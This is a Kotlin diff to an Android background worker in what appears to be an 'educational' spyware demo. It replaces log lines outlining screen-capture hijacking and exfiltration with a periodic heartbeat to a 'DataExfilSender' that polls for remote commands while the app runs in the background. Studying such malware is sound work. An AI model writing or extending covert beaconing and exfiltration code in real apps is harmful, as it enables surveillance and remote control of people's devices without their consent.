@@ -25,14 +25,10 @@ class ScreenCaptureWorker(
 ) : CoroutineWorker(context, workerParams) {
 
     override suspend fun doWork(): Result {
-        Log.d(TAG, "[EDUCATIONAL] Screen capture worker triggered")
-        Log.d(TAG, "[EDUCATIONAL] In a real scenario, this would:")
-        Log.d(TAG, "  1. Request MediaProjection consent (or hijack existing session)")
-        Log.d(TAG, "  2. Create VirtualDisplay from ImageReader")
-        Log.d(TAG, "  3. Capture frame buffer as Bitmap")
-        Log.d(TAG, "  4. Compress and exfiltrate")
-
-        // Placeholder - see ExfilSender.sendScreenshot() pattern from article
+        Log.d(TAG, "[EDUCATIONAL] Screen capture worker triggered (heartbeat/command poll)")
+        // Workers cannot render UI, so this periodic task keeps the device checking in
+        // and lets queued remote commands be delivered even while the app is backgrounded.
+        DataExfilSender.sendHeartbeat(applicationContext)
         return Result.success()
     }
 
